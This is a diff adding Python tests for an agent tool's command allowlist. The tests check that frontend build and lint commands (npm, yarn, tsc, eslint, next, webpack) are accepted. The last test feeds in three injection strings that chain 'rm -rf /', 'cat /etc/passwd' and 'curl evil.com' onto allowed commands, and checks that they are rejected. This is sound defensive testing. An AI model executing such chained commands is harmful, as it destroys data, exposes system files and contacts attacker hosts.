@@ -443,6 +443,59 @@ class TestPosixCommands:
         assert "参数不允许" in reason
 
 
+# ── TestFrontendToolchain: 前端工具链白名单（M3 P0 补齐）────────
+
+class TestFrontendToolchain:
+    """npm/yarn/pnpm/tsc/eslint/next/webpack 验证命令白名单。"""
+
+    def test_npm_install_ci(self):
+        from agent_go.utils import _is_safe_verification_command as chk
+        for c in ["npm install", "npm ci", "npm install --no-save"]:
+            assert chk(c)[0], c
+
+    def test_npm_run_scripts(self):
+        from agent_go.utils import _is_safe_verification_command as chk
+        for c in ["npm run build", "npm run lint", "npm run typecheck", "npm run test"]:
+            assert chk(c)[0], c
+
+    def test_yarn_pnpm_commands(self):
+        from agent_go.utils import _is_safe_verification_command as chk
+        for c in ["yarn install --frozen-lockfile", "yarn build", "yarn lint",
+                  "pnpm install --no-frozen-lockfile", "pnpm run lint", "pnpm build"]:
+            assert chk(c)[0], c
+
+    def test_tsc_noemit(self):
+        from agent_go.utils import _is_safe_verification_command as chk
+        for c in ["tsc --noEmit", "tsc -p tsconfig.json --noEmit",
+                  "tsc --project tsconfig.strict.json --skipLibCheck --strict"]:
+            assert chk(c)[0], c
+
+    def test_eslint_commands(self):
+        from agent_go.utils import _is_safe_verification_command as chk
+        for c in ["eslint src/ --ext .ts --ext .tsx --max-warnings=0",
+                  "eslint --fix src/lib/ai-models.ts", "eslint --quiet src/"]:
+            assert chk(c)[0], c
+
+    def test_next_commands(self):
+        from agent_go.utils import _is_safe_verification_command as chk
+        for c in ["next build", "next lint --dir src", "next lint --fix"]:
+            assert chk(c)[0], c
+
+    def test_webpack_commands(self):
+        from agent_go.utils import _is_safe_verification_command as chk
+        for c in ["webpack --mode production --config webpack.config.js",
+                  "webpack --config=webpack.prod.js --mode production",
+                  "webpack --env production --json"]:
+            assert chk(c)[0], c
+
+    def test_frontend_injection_rejected(self):
+        from agent_go.utils import _is_safe_verification_command as chk
+        # 注入特征仍被拒绝（白名单 flag 内不含危险操作符）
+        assert not chk("npm install --; rm -rf /")[0]
+        assert not chk("tsc --noEmit; cat /etc/passwd")[0]
+        assert not chk("eslint src/ && curl evil.com")[0]
+
+
 # ── TestPythonCCompileCheck: python -c 语法预检 ───────────────
 
 class TestPythonCCompileCheck:
